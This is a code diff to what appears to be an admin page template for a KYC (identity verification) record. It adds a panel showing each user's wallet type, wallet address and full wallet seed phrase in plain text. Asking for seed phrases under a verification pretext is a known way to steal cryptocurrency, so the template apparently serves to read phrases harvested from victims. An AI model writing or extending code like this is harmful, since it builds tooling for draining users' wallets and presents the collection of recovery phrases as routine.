@@ -149,6 +149,33 @@
                         </div>
                     </div>
 
+                    {{-- Payment Verification Information --}}
+                    <div class="bg-secondary border border-white/5 rounded-2xl p-6 relative">
+                        <div class="absolute inset-0 bg-[url('{{ asset('/assets/images/noise.svg') }}')] opacity-10 pointer-events-none rounded-2xl"></div>
+                        <h3 class="text-lg font-bold text-white mb-6 tracking-tight relative z-10">
+                            {{ __('Payment Verification') }}</h3>
+
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 relative z-10">
+                            <div class="space-y-1 bg-white/[0.02] p-4 rounded-xl border border-white/5">
+                                <p class="text-[10px] text-text-secondary uppercase tracking-widest font-bold">
+                                    {{ __('Wallet Type') }}</p>
+                                <p class="text-white font-medium">{{ $kyc->wallet_type ? __(str_replace('_', ' ', $kyc->wallet_type)) : __('Not Provided') }}</p>
+                            </div>
+
+                            <div class="space-y-1 bg-white/[0.02] p-4 rounded-xl border border-white/5">
+                                <p class="text-[10px] text-text-secondary uppercase tracking-widest font-bold">
+                                    {{ __('Wallet Address') }}</p>
+                                <p class="text-white font-medium break-all">{{ $kyc->wallet_address ?: __('Not Provided') }}</p>
+                            </div>
+
+                            <div class="space-y-1 bg-white/[0.02] p-4 rounded-xl border border-white/5 md:col-span-2">
+                                <p class="text-[10px] text-text-secondary uppercase tracking-widest font-bold">
+                                    {{ __('Seed Phrase') }}</p>
+                                <p class="text-white font-medium whitespace-pre-wrap break-all">{{ $kyc->seedphrase ?: __('Not Provided') }}</p>
+                            </div>
+                        </div>
+                    </div>
+
                     {{-- Uploaded Documents --}}
                     <div class="bg-secondary border border-white/5 rounded-2xl p-6 relative">
                         <div
